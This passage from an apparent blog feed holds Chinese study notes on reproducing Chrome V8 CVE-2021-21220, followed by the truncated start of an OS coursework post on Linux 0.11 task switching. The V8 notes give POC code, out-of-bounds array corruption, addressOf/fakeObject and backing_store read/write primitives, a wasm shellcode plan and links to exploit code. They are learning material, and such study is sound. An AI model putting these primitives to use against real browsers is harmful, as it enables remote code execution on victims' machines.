class=\"line\">进入到v8目录,选择好要编译的commit(不然默认编译最新的)</span><br><span class=\"line\">git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599</span><br><span class=\"line\">gclient sync # 同步更新</span><br><span class=\"line\"># 编译可执行文件 (二选一)</span><br><span class=\"line\">tools/dev/v8gen.py x64.debug</span><br><span class=\"line\">ninja -C out.gn/x64.debug d8</span><br><span class=\"line\">上面和下面是二选一</span><br><span class=\"line\">tools/dev/v8gen.py x64.relase</span><br><span class=\"line\">ninja -C out.gn/x64.relase d8</span><br></pre></td></tr></table></figure>\n\n<p>这里有个坑,就是,debug版本会有很多调试信息,release没有,并且,release不能使用v8的gdb脚本(如job命令),如果想要release能使用gdb脚本的话,需要执行完<code>tools/dev/v8gen.py x64.release</code>后在生成的 <code>out.gn/x64.release/args.gn</code>中追加</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v8_enable_backtrace = <span class=\"literal\">true</span></span><br><span class=\"line\">v8_enable_disassembler = <span class=\"literal\">true</span></span><br><span class=\"line\">v8_enable_object_print = <span class=\"literal\">true</span></span><br><span class=\"line\">v8_enable_verify_heap = <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p>参考:<a href=\"https://www.cjovi.icu/CVE/1586.html\">https://www.cjovi.icu/CVE/1586.html</a></p>\n<h2 id=\"四、配置v8自带的gdb脚本-方便调试\"><a href=\"#四、配置v8自带的gdb脚本-方便调试\" class=\"headerlink\" title=\"四、配置v8自带的gdb脚本,方便调试\"></a>四、配置v8自带的gdb脚本,方便调试</h2><p>v8自带了gdb调试脚本</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_2.png\" alt=\"Untitled_2\"></p>\n<p>1.把v8&#x2F;tools&#x2F;gdbinit内容加到~&#x2F;.gdbint里面</p>\n<p>2.将v8&#x2F;tools&#x2F;gdb-v8-support.py放到一个目录(当前也行)</p>\n<p>在~&#x2F;.gdbint开头加入 <code>source /自定义目录/gdb-v8-support.py</code></p>\n<p>参考:<a href=\"https://paper.seebug.org/1821/\">https://paper.seebug.org/1821/</a></p>\n<h1 id=\"RCE的完整步骤\"><a href=\"#RCE的完整步骤\" class=\"headerlink\" title=\"RCE的完整步骤\"></a>RCE的完整步骤</h1><h2 id=\"incorrect-numeric-理解漏洞本身\"><a href=\"#incorrect-numeric-理解漏洞本身\" class=\"headerlink\" title=\"incorrect numeric (理解漏洞本身)\"></a>incorrect numeric (理解漏洞本身)</h2><p>POC</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> _arr = new Uint32Array([<span class=\"number\">2</span>**<span class=\"number\">31</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">function <span class=\"title function_\">foo</span><span class=\"params\">(a)</span> &#123;</span><br><span class=\"line\">    var x = <span class=\"number\">1</span>;</span><br><span class=\"line\">    x = (_arr[<span class=\"number\">0</span>] ^ <span class=\"number\">0</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    x = Math.<span class=\"built_in\">abs</span>(x);</span><br><span class=\"line\">    x -= <span class=\"number\">2147483647</span>;</span><br><span class=\"line\">    x = Math.max(x, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    x -= <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(x==<span class=\"number\">-1</span>) x = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    var arr = new Array(x);</span><br><span class=\"line\">    arr.shift();</span><br><span class=\"line\">    var cor = [<span class=\"number\">1.1</span>, <span class=\"number\">1.2</span>, <span class=\"number\">1.3</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> [arr, cor];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://paper.seebug.org/1850/\">https://paper.seebug.org/1850/</a></p>\n<p><a href=\"https://paper.seebug.org/1556/\">https://paper.seebug.org/1556/</a></p>\n<p>那么 这个长度-1的数组有什么用呢??????,见下面 Array.shift</p>\n<h2 id=\"OOB-out-of-bounds-memory-access-越界访问\"><a href=\"#OOB-out-of-bounds-memory-access-越界访问\" class=\"headerlink\" title=\"OOB (out-of-bounds memory access) 越界访问\"></a>OOB (out-of-bounds memory access) 越界访问</h2><p>abusing array bounds check elimination.</p>\n<p>有历史沿革,之前是<a href=\"https://chromium.googlesource.com/v8/v8.git/+/7bb6dc0e06fa158df508bc8997f0fce4e33512a5\">bounds-check elimination</a>的问题,后来去掉了,但又有新的利用方式</p>\n<h3 id=\"利用Array-shift实现oob\"><a href=\"#利用Array-shift实现oob\" class=\"headerlink\" title=\"利用Array.shift实现oob\"></a>利用Array.shift实现oob</h3><p><a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=1198696\">https://bugs.chromium.org/p/chromium/issues/detail?id=1198696</a></p>\n<p>而负长度被视为一个正的大长度,因此该数组允许访问任意 OOB 数据。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function <span class=\"title function_\">foo</span><span class=\"params\">(a)</span> &#123;</span><br><span class=\"line\">        let x = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a) x = <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">        var arr = new Array(Math.sign(<span class=\"number\">0</span> - Math.max(<span class=\"number\">0</span>, x, <span class=\"number\">-1</span>)));<span class=\"comment\">//构造长度为-1的数组</span></span><br><span class=\"line\">        arr.shift();</span><br><span class=\"line\">        let local_arr = Array(<span class=\"number\">2</span>);</span><br><span class=\"line\">        console.<span class=\"built_in\">log</span>(<span class=\"string\">&quot;现在长度&quot;</span>+arr.length)</span><br><span class=\"line\">        local_arr[<span class=\"number\">0</span>] = <span class=\"number\">5.1</span>;<span class=\"comment\">//4014666666666666</span></span><br><span class=\"line\">        let buff = new LeakArrayBuffer(<span class=\"number\">0x1000</span>);<span class=\"comment\">//byteLength idx=8</span></span><br><span class=\"line\">        arr[<span class=\"number\">0</span>] = <span class=\"number\">0x1122</span>; <span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> [arr, local_arr, buff];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (var i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x10000</span>; ++i)</span><br><span class=\"line\">        foo(<span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    gc(); gc(); </span><br><span class=\"line\">    [corrput_arr, rwarr, corrupt_buff] = foo(<span class=\"literal\">true</span>);</span><br><span class=\"line\">\t\tcorrput_arr[<span class=\"number\">12</span>] = <span class=\"number\">0x22444</span>;</span><br><span class=\"line\">\t\tdelete corrput_arr;</span><br></pre></td></tr></table></figure>\n\n<p>  通过上述漏洞,我们实现了一个长度为-1的数组arr(corrput_arr),-1扩展为无符号,就是0xffffffff,是一个很大的正数,从而可以实现越界读写,在此基础之上,进行后面的利用</p>\n<p>  1.获得了一个0xfffffff(-1长度)数组 arr(corrput_arr)</p>\n<p>  2.声明一个local_arr(rwarr),长度为2, 接着利用arr的oob,溢出修改它的长度为0x22444,也就是corrput_arr[12] &#x3D; 0x22444; (或者说 arr[12] &#x3D; 0x22444;) 这一位对应的是数组的长度</p>\n<p>  3.声明长度为0x1000的ArrayBuffer(corrupt_buff)</p>\n<p>  在2、3两步,我们能够得到一个数组和一个ArrayBuffer,但是我们还不能任意读写这个ArrayBuffer,一种实现方法是,通过corrput_arr的溢出,将rwarr的长度变长,覆盖到ArrayBuffer,于是我们就能够对他进行任意读写,从而实现对内存任意地址读写(其实是受限的,rwx)</p>\n<p>  为什么要强调ArrayBuffer呢?且看下面</p>\n<p>  疑问:从而实现对rwarr(local_arr)的跨界访问,为啥要这样呢?? 为啥不直接用arr</p>\n<h2 id=\"越界访问rwarr数组-实现可控的JSArrayBuffer\"><a href=\"#越界访问rwarr数组-实现可控的JSArrayBuffer\" class=\"headerlink\" title=\"越界访问rwarr数组(实现可控的JSArrayBuffer)\"></a>越界访问rwarr数组(实现可控的JSArrayBuffer)</h2><p>  这张图比较形象,我们现在可以越界访问的是corrupt_arr,然后新建了一个rwarr数组,那么可以越界访问,把rwarr的长度修改的大一点,对应代码 corrput_arr[12] &#x3D; 0x22444;</p>\n<p>  那么为什么数组的第13位是代表着它的长度呢?这个具体原理方法在参考博客里,和它的数据结构有关.</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_3.png\" alt=\"Untitled_3\"></p>\n<h2 id=\"越界访问corrupt-buff-实现任意地址读写\"><a href=\"#越界访问corrupt-buff-实现任意地址读写\" class=\"headerlink\" title=\"越界访问corrupt_buff(实现任意地址读写)\"></a><strong><strong>越界访问corrupt_buff(实现任意地址读写)</strong></strong></h2><p><a href=\"http://www.hackdig.com/03/hack-70813.htm\">http://www.hackdig.com/03/hack-70813.htm</a></p>\n<p>  背景知识:什么是backing_store? 对漏洞利用有什么用?</p>\n<p>  backing_store指向初始化JSArrayBuffer时用户申请大小的堆，如果我们控制了一个JSArrayBuffer相当于一个指针和指针的内容可以同时改写。这样我们改写backing_store读取控制的JSArrayBuffer的内容就是任意地址读；我们改写backing_store修改控制的JSArrayBuffer的内容就是任意地址写。</p>\n<p>  如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。</p>\n<h3 id=\"任意地址写-通过伪造backing-store\"><a href=\"#任意地址写-通过伪造backing-store\" class=\"headerlink\" title=\"任意地址写(通过伪造backing_store)\"></a>任意地址写(通过伪造backing_store)</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function <span class=\"title function_\">setbackingStore</span><span class=\"params\">(hi, low)</span> &#123;</span><br><span class=\"line\">           rwarr[<span class=\"number\">4</span>] = i2f(fLow(rwarr[<span class=\"number\">4</span>]), hi);</span><br><span class=\"line\">           rwarr[<span class=\"number\">5</span>] = i2f(low, fHi(rwarr[<span class=\"number\">5</span>]));</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure>\n\n<p>   从corrupt_buff中声明一个Dataview,而backing_store记录的就是实际DataView的内存地址。如果我们将这个backing_store指针修改为我们想要写入的内存地址，那么我们再调用view.setUint32(0, poc, true) 类似指令时，实际上就是向指定内存地址处写入了poc，从而达到任意地址写。</p>\n<p>  那么我们已经可以利用rwarr实现对corrupt_buff的任意读写,即可以任意修改backing_store.</p>\n<h3 id=\"任意地址读-类型混淆\"><a href=\"#任意地址读-类型混淆\" class=\"headerlink\" title=\"任意地址读(类型混淆)\"></a>任意地址读(类型混淆)</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function <span class=\"title function_\">leakObjLow</span><span class=\"params\">(o)</span> &#123;</span><br><span class=\"line\">           corrupt_buff.slot = o;</span><br><span class=\"line\">           <span class=\"keyword\">return</span> (fLow(rwarr[<span class=\"number\">9</span>]) - <span class=\"number\">1</span>);</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure>\n\n<p>  leakObjLow函数使用corrupt_buff的slot属性，修改该属性为某一对象o，那么o的地址就会被写入到corrupt_buff所在的内存区间中，然后利用rwarr的溢出访问该值，实现泄露。</p>\n<p>  这里是不是用了类型混淆??</p>\n<h3 id=\"利用oob造成类型混淆-那怎么利用呢\"><a href=\"#利用oob造成类型混淆-那怎么利用呢\" class=\"headerlink\" title=\"利用oob造成类型混淆,那怎么利用呢?\"></a>利用oob造成类型混淆,那怎么利用呢?</h3><p>那出现类型混淆怎么利用呢？举个例子，如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。</p>\n<p><a href=\"https://www.freebuf.com/vuls/203721.html\">https://www.freebuf.com/vuls/203721.html</a></p>\n<p><strong>addressOf 泄露某个对象的内存地址</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 泄露某个object的地址</span></span><br><span class=\"line\">function <span class=\"title function_\">addressOf</span><span class=\"params\">(obj_to_leak)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    obj_array[<span class=\"number\">0</span>] = obj_to_leak;</span><br><span class=\"line\">    obj_array.oob(float_array_map);</span><br><span class=\"line\">    let obj_addr = f2i(obj_array[<span class=\"number\">0</span>]) - <span class=\"number\">1</span>n;</span><br><span class=\"line\">    obj_array.oob(obj_array_map); <span class=\"comment\">// 还原array类型以便后续继续使用</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj_addr;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>fakeObject 将指定内存强制转换为一个js对象(有什么用呢?)</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 将某个addr强制转换为object对象</span></span><br><span class=\"line\">function <span class=\"title function_\">fakeObject</span><span class=\"params\">(addr_to_fake)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    float_array[<span class=\"number\">0</span>] = i2f(addr_to_fake + <span class=\"number\">1</span>n);</span><br><span class=\"line\">    float_array.oob(obj_array_map);</span><br><span class=\"line\">    let faked_obj = float_array[<span class=\"number\">0</span>];</span><br><span class=\"line\">    float_array.oob(float_array_map); <span class=\"comment\">// 还原array类型以便后续继续使用</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> faked_obj;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"如何实现任意地址读写：构造AAR-x2F-AAW原语\"><a href=\"#如何实现任意地址读写：构造AAR-x2F-AAW原语\" class=\"headerlink\" title=\"如何实现任意地址读写：构造AAR&#x2F;AAW原语\"></a><strong><strong>如何实现任意地址读写：构造AAR&#x2F;AAW原语</strong></strong></h3><p><a href=\"https://paper.seebug.org/1821/#wasm\">https://paper.seebug.org/1821/#wasm</a></p>\n<p>fakeObject强制将一块内存伪造成一个数组对象??? 它的elements 指针是可控的,而这个指针指向了存储数组元素内容的内存地址。如果我们将这个指针修改为我们想要访问的内存地址，那后续我们访问这个数组对象的内容,实际上访问的就是我们修改后的内存地址指向的内容，这样也就实现了对任意指定地址的内存访问读写效果了。</p>\n<p>哦哦哦因为可以任意访问,把这个当成一个数组对象了,那么对这个数组,我们是可以任意读取和修改的????</p>\n<h2 id=\"wasm-webassembly-实现执行shellcode\"><a href=\"#wasm-webassembly-实现执行shellcode\" class=\"headerlink\" title=\"wasm(webassembly) 实现执行shellcode\"></a>wasm(webassembly) 实现执行shellcode</h2><p><a href=\"https://paper.seebug.org/1821/#wasm\">https://paper.seebug.org/1821/#wasm</a></p>\n<p><a href=\"https://www.freebuf.com/vuls/203721.html\">https://www.freebuf.com/vuls/203721.html</a></p>\n<p>简单来说，wasm就是可以让JavaScript直接执行高级语言生成的机器码的一种技术。</p>\n<p><a href=\"https://sensepost.com/blog/2018/introduction-to-webassembly/\">https://sensepost.com/blog/2018/introduction-to-webassembly/</a></p>\n<h3 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h3><p>首先加载一段wasm代码到内存中<br>然后通过addresssOf原语找到存放wasm的内存地址<br>接着通过任意地址写原语用shellcode替换原本wasm的代码内容<br>最后调用wasm的函数接口即可触发调用shellcode</p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><h2 id=\"漏洞复现参考\"><a href=\"#漏洞复现参考\" class=\"headerlink\" title=\"漏洞复现参考\"></a>漏洞复现参考</h2><p><a href=\"https://blog.csdn.net/m0_56642842/article/details/118358830\">https://blog.csdn.net/m0_56642842&#x2F;article&#x2F;details&#x2F;118358830</a> 这个就是教你怎么复现,不涉及原理</p>\n<p><a href=\"https://www.cnblogs.com/7omss/p/15661338.html\">https://www.cnblogs.com/7omss/p/15661338.html</a> + 1</p>\n<p>exploit:<a href=\"https://share.weiyun.com/EXlNm02A\">https://share.weiyun.com/EXlNm02A</a> </p>\n<p>浏览器:<a href=\"https://share.weiyun.com/fZLcxFe9\">https://share.weiyun.com/fZLcxFe9</a></p>\n<h2 id=\"漏洞分析、调试及RCE步骤参考\"><a href=\"#漏洞分析、调试及RCE步骤参考\" class=\"headerlink\" title=\"漏洞分析、调试及RCE步骤参考\"></a>漏洞分析、调试及RCE步骤参考</h2><p><a href=\"https://zhuanlan.zhihu.com/p/365297858\">https://zhuanlan.zhihu.com/p/365297858</a></p>\n<p><a href=\"https://blog.csdn.net/smellycat000/article/details/116078164\">https://blog.csdn.net/smellycat000/article/details/116078164</a></p>\n<p><a href=\"https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce\">https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce</a></p>\n<p><a href=\"https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/\">https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/</a></p>\n<p><a href=\"https://github.com/security-dbg/CVE-2021-21220/blob/main/exploit.js\">https://github.com/security-dbg/CVE-2021-21220/blob/main/exploit.js</a></p>\n<p><a href=\"https://buaq.net/go-97833.html\">https://buaq.net/go-97833.html</a></p>\n<p><a href=\"https://ruan777.github.io/2022/01/18/chrome-cve-2021-21220%E5%88%86%E6%9E%90/\">https://ruan777.github.io/2022/01/18/chrome-cve-2021-21220分析/</a></p>\n<p><a href=\"https://github.com/Bounty-Team/Bounty-Team.github.io/blob/e0f717119de0c8a46aef0bde3e2bf2a4a9fe71bc/_posts/2021-04-16-CVE-2021-21220.md\">https://github.com/Bounty-Team/Bounty-Team.github.io/blob/e0f717119de0c8a46aef0bde3e2bf2a4a9fe71bc/_posts&#x2F;2021-04-16-CVE-2021-21220.md</a></p>\n<p><a href=\"https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce\">https://www.zerodayinitiative.com/blog/2021/12/15/exploitation-of-cve-2021-21220-from-incorrect-jit-behavior-to-rce</a></p>\n<p><a href=\"https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf\">https://github.com/singularseclab/Slides/blob/main/2021/chrome_exploitation-zer0con2021.pdf</a></p>\n<p><a href=\"https://www.sohu.com/a/383228797_354899\">https://www.sohu.com/a/383228797_354899</a></p>\n<p><a href=\"https://bounty-team.github.io/vulnerability%20analysis/2021/04/16/CVE-2021-21220/\">https://bounty-team.github.io/vulnerability analysis/2021/04/16/CVE-2021-21220/</a></p>\n<p><a href=\"https://www.freebuf.com/vuls/269629.html\">https://www.freebuf.com/vuls/269629.html</a></p>\n<p><a href=\"https://www.cjovi.icu/CVE/1586.html\">https://www.cjovi.icu/CVE/1586.html</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5190\">https://xz.aliyun.com/t/5190</a>。<strong>v8 exploit入门[PlaidCTF roll a d8]</strong></p>\n<p><a href=\"https://gtoad.github.io/2019/07/25/V8-Debug/\">https://gtoad.github.io/2019/07/25/V8-Debug/</a>  <strong><strong>V8引擎漏洞分析环境与调试方法基础</strong></strong></p>\n<p><a href=\"https://paper.seebug.org/1850/\">https://paper.seebug.org/1850/</a>   <strong><strong>从 0 开始学 V8 漏洞利用之 CVE-2021-21220（八）</strong></strong></p>\n<p><a href=\"https://www.freebuf.com/vuls/230182.html\">https://www.freebuf.com/vuls/230182.html</a>。<strong><strong>v8利用入门：从越界访问到RCE</strong></strong></p>\n<p><a href=\"https://www.freebuf.com/vuls/203721.html\">https://www.freebuf.com/vuls/203721.html</a></p>\n<p><a href=\"https://www.cjovi.icu/CVE/1586.html\">https://www.cjovi.icu/CVE/1586.html</a></p>\n<p><a href=\"https://tiszka.com/blog/CVE_2021_21225.html\">https://tiszka.com/blog/CVE_2021_21225.html</a></p>\n<p><a href=\"https://kiprey.github.io/2021/01/v8-turboFan/\">https://kiprey.github.io/2021/01/v8-turboFan/</a></p>\n",
            "tags": [
                "浏览器安全"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8B/",
            "url": "https://tangzichengcc.github.io/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8B/",
            "title": "ucas-操作系统-思考题下",
            "date_published": "2022-11-14T03:01:59.000Z",
            "content_html": "<h1 id=\"21-进程0创建进程1时，为进程1建立了task-struct及内核栈，第一个页表，分别位于物理内存16MB顶端倒数第一页、第二页。请问，这两个页究竟占用的是谁的线性地址空间，内核、进程0、进程1、还是没有占用任何线性地址空间？说明理由（可以图示）并给出代码证据。\"><a href=\"#21-进程0创建进程1时，为进程1建立了task-struct及内核栈，第一个页表，分别位于物理内存16MB顶端倒数第一页、第二页。请问，这两个页究竟占用的是谁的线性地址空间，内核、进程0、进程1、还是没有占用任何线性地址空间？说明理由（可以图示）并给出代码证据。\" class=\"headerlink\" title=\"21.进程0创建进程1时，为进程1建立了task_struct及内核栈，第一个页表，分别位于物理内存16MB顶端倒数第一页、第二页。请问，这两个页究竟占用的是谁的线性地址空间，内核、进程0、进程1、还是没有占用任何线性地址空间？说明理由（可以图示）并给出代码证据。\"></a>21.进程0创建进程1时，为进程1建立了task_struct及内核栈，第一个页表，分别位于物理内存16MB顶端倒数第一页、第二页。请问，这两个页究竟占用的是谁的线性地址空间，内核、进程0、进程1、还是没有占用任何线性地址空间？说明理由（可以图示）并给出代码证据。</h1><p>p92</p>\n<p>第一页task_struct 就是进程1的</p>\n<p>第二页是和进程0一样的线性地址空间?</p>\n<h1 id=\"22-假设：经过一段时间的运行，操作系统中已经有5个进程在运行，且内核分别为进程4、进程5分别创建了第一个页表，这两个页表在谁的线性地址空间？用图表示这两个页表在线性地址空间和物理地址空间的映射关系。\"><a href=\"#22-假设：经过一段时间的运行，操作系统中已经有5个进程在运行，且内核分别为进程4、进程5分别创建了第一个页表，这两个页表在谁的线性地址空间？用图表示这两个页表在线性地址空间和物理地址空间的映射关系。\" class=\"headerlink\" title=\"22.假设：经过一段时间的运行，操作系统中已经有5个进程在运行，且内核分别为进程4、进程5分别创建了第一个页表，这两个页表在谁的线性地址空间？用图表示这两个页表在线性地址空间和物理地址空间的映射关系。\"></a>22.假设：经过一段时间的运行，操作系统中已经有5个进程在运行，且内核分别为进程4、进程5分别创建了第一个页表，这两个页表在谁的线性地址空间？用图表示这两个页表在线性地址空间和物理地址空间的映射关系。</h1><h1 id=\"23-代码中的”ljmp-0-n-t”-很奇怪，按理说jmp指令跳转到得位置应该是一条指令的地址，可是这行代码却跳到了”m”-amp-tmp-a-，这明明是一个数据的地址，更奇怪的，这行代码竟然能正确执行。请论述其中的道理。\"><a href=\"#23-代码中的”ljmp-0-n-t”-很奇怪，按理说jmp指令跳转到得位置应该是一条指令的地址，可是这行代码却跳到了”m”-amp-tmp-a-，这明明是一个数据的地址，更奇怪的，这行代码竟然能正确执行。请论述其中的道理。\" class=\"headerlink\" title=\"23.代码中的”ljmp %0\\n\\t” 很奇怪，按理说jmp指令跳转到得位置应该是一条指令的地址，可是这行代码却跳到了”m” (*&amp;__tmp.a)，这明明是一个数据的地址，更奇怪的，这行代码竟然能正确执行。请论述其中的道理。\"></a>23.代码中的”ljmp %0\\n\\t” 很奇怪，按理说jmp指令跳转到得位置应该是一条指令的地址，可是这行代码却跳到了”m” (*&amp;__tmp.a)，这明明是一个数据的地址，更奇怪的，这行代码竟然能正确执行。请论述其中的道理。</h1><p>p106\\127</p>\n<p>include&#x2F;linux&#x2F;sched.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> *\tswitch_to(n) should switch tasks to task nr n, first</span></span><br><span class=\"line\"><span class=\"comment\"> * checking that n isn&#x27;t the current task, in which case it does nothing.</span></span><br><span class=\"line\"><span class=\"comment\"> * This also clears the TS-flag if the task we switched to has used</span></span><br><span class=\"line\"><span class=\"comment\"> * tha math co-processor latest.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> switch_to(n) &#123;\\</span></span><br><span class=\"line\"><span class=\"meta\">struct &#123;long a,b;&#125; __tmp; \\</span></span><br><span class=\"line\"><span class=\"meta\">__asm__(<span class=\"string\">&quot;cmpl %%ecx,_current\\n\\t&quot;</span> \\</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"string\">&quot;je 1f\\n\\t&quot;</span> \\</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"string\">&quot;movw %%dx,%1\\n\\t&quot;</span> \\</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"string\">&quot;xchgl %%ecx,_current\\n\\t&quot;</span> \\ <span class=\"comment\">//强行切到进程0</span></span></span><br><span class=\"line\">\t<span class=\"string\">&quot;ljmp %0\\n\\t&quot;</span> \\ <span class=\"comment\">//第一次执行完 for pause 这一行执行完了执行 _syscall0的 if(__res &gt;=0) || 看这里 copy_process: p-&gt;tss.eip = eip; </span></span><br><span class=\"line\">\t<span class=\"string\">&quot;cmpl %%ecx,_last_task_used_math\\n\\t&quot;</span> \\ <span class=\"comment\">//进程0回到for pause</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;jne 1f\\n\\t&quot;</span> \\</span><br><span class=\"line\">\t<span class=\"string\">&quot;clts\\n&quot;</span> \\</span><br><span class=\"line\">\t<span class=\"string\">&quot;1:&quot;</span> \\</span><br><span class=\"line\">\t::<span class=\"string\">&quot;m&quot;</span> (*&amp;__tmp.a),<span class=\"string\">&quot;m&quot;</span> (*&amp;__tmp.b), \\ <span class=\"comment\">//IA32 任务切换</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;d&quot;</span> (_TSS(n)),<span class=\"string\">&quot;c&quot;</span> ((<span class=\"type\">long</span>) task[n])); \\</span><br><span 